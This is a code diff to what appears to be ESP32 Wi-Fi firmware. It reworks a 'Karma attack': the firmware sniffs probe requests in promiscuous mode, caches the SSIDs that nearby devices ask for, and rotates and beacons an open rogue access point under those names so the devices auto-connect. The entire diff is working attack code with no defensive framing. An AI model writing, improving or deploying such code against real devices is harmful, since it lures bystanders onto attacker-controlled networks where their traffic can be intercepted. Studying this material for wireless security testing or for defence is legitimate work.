@@ -60,6 +60,8 @@
 // limit how many ap records we keep to avoid memory bloat/crashes
 #define MAX_SCANNED_APS 100
 
+#define KARMA_MAX_SSIDS 32
+
 static char g_beacon_list[BEACON_LIST_MAX][BEACON_SSID_MAX_LEN+1];
 static int g_beacon_list_count = 0;
 
@@ -4505,45 +4507,45 @@ static void inject_sae_confirm_frame(void) {
 static bool karma_running = false;
 static TaskHandle_t karma_task_handle = NULL;
 
+// Add these globals near your other Karma variables
+static char karma_ssid_cache[KARMA_MAX_SSIDS][33];
+static int karma_ssid_count = 0;
+static int karma_ssid_index = 0;
+static uint32_t last_ssid_change_time = 0;
+
+// Helper to add SSID to cache if not present
+static void karma_add_ssid(const char *ssid) {
+    if (ssid == NULL || strlen(ssid) == 0) return;
+    // Check for duplicate
+    for (int i = 0; i < karma_ssid_count; ++i) {
+        if (strcmp(karma_ssid_cache[i], ssid) == 0) return;
+    }
+    // Add if space
+    if (karma_ssid_count < KARMA_MAX_SSIDS) {
+        strncpy(karma_ssid_cache[karma_ssid_count], ssid, 32);
+        karma_ssid_cache[karma_ssid_count][32] = '\0';
+        karma_ssid_count++;
+        printf("Karma cached SSID: %s\n", ssid);
+        TERMINAL_VIEW_ADD_TEXT("Karma cached SSID: %s\n", ssid);
+    }
+}
+// Update your probe request callback:
 static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT) return;
-
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
     const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
-
-    // Check if it's a probe request (subtype 4)
     uint8_t subtype = (hdr->frame_ctrl & 0xF0) >> 4;
     if (subtype != 4) return;
-
-    // Extract SSID from probe request
     const uint8_t *payload = ipkt->payload;
     int ssid_offset = 0;
-    // Find SSID IE (0x00)
     while (ssid_offset < pkt->rx_ctrl.sig_len - 24) {
         if (payload[ssid_offset] == 0x00) { // SSID IE
             uint8_t ssid_len = payload[ssid_offset + 1];
             if (ssid_len > 0 && ssid_len < 33) {
                 char probed_ssid[33] = {0};
                 memcpy(probed_ssid, &payload[ssid_offset + 2], ssid_len);
-                printf("Probed SSID: %s\n", probed_ssid);
-                TERMINAL_VIEW_ADD_TEXT("Probed SSID: %s\n", probed_ssid);
-
-                // Start AP with probed SSID
-                wifi_config_t ap_config = {
-                    .ap = {
-                        .ssid = "",
-                        .ssid_len = ssid_len,
-                        .channel = 1,
-                        .authmode = WIFI_AUTH_OPEN,
-                        .max_connection = 4,
-                        .ssid_hidden = 0
-                    }
-                };
-                memcpy(ap_config.ap.ssid, probed_ssid, ssid_len);
-                ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-                ESP_ERROR_CHECK(esp_wifi_start());
+                karma_add_ssid(probed_ssid);
             }
             break;
         }
@@ -4551,28 +4553,48 @@ static void karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t 
     }
 }
 
+// Update your karma_task to rotate SSIDs:
 static void karma_task(void *param) {
     printf("Karma attack started\n");
     TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
-
     wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
     esp_wifi_set_promiscuous_filter(&filter);
     esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);
 
+    last_ssid_change_time = esp_timer_get_time() / 1000;
     while (karma_running) {
-        // This callback will be called for every management frame
-        // You need to register a callback that checks for probe requests
-        // and responds by creating an AP with the probed SSID
-
-        // For simplicity, let's assume you have a callback:
-        // karma_probe_request_callback(void *buf, wifi_promiscuous_pkt_type_t type);
-
-        // You can register it like this:
-        esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);
-
-        vTaskDelay(pdMS_TO_TICKS(1000)); // Check every second
+        uint32_t now = esp_timer_get_time() / 1000;
+        // Rotate AP SSID every 5 seconds
+        if (karma_ssid_count > 0 && (now - last_ssid_change_time > 5000)) {
+            wifi_config_t ap_config = {
+                .ap = {
+                    .ssid = "",
+                    .ssid_len = strlen(karma_ssid_cache[karma_ssid_index]),
+                    .channel = 1,
+                    .authmode = WIFI_AUTH_OPEN,
+                    .max_connection = 4,
+                    .ssid_hidden = 0
+                }
+            };
+            strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
+            ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+            ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
+            ESP_ERROR_CHECK(esp_wifi_start());
+            printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
+            TERMINAL_VIEW_ADD_TEXT("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
+            karma_ssid_index = (karma_ssid_index + 1) % karma_ssid_count;
+            last_ssid_change_time = now;
+        }
+    
+        // Send beacon frames for all cached SSIDs (every 500ms)
+        for (int i = 0; i < karma_ssid_count; ++i) {
+            wifi_manager_broadcast_ap(karma_ssid_cache[i]);
+            vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between beacons
+        }
+    
+        vTaskDelay(pdMS_TO_TICKS(500));
     }
-
     esp_wifi_set_promiscuous(false);
     karma_task_handle = NULL;
     printf("Karma attack stopped\n");
@@ -4587,6 +4609,8 @@ void wifi_manager_start_karma(void) {
         return;
     }
     karma_running = true;
+    karma_ssid_count = 0;
+    karma_ssid_index = 0;
     xTaskCreate(karma_task, "karma_task", 4096, NULL, 5, &karma_task_handle);
 }
 
@@ -4597,5 +4621,7 @@ void wifi_manager_stop_karma(void) {
         return;
     }
     karma_running = false;
+    karma_ssid_count = 0;
+    karma_ssid_index = 0;
     // Task will clean up itself
 }
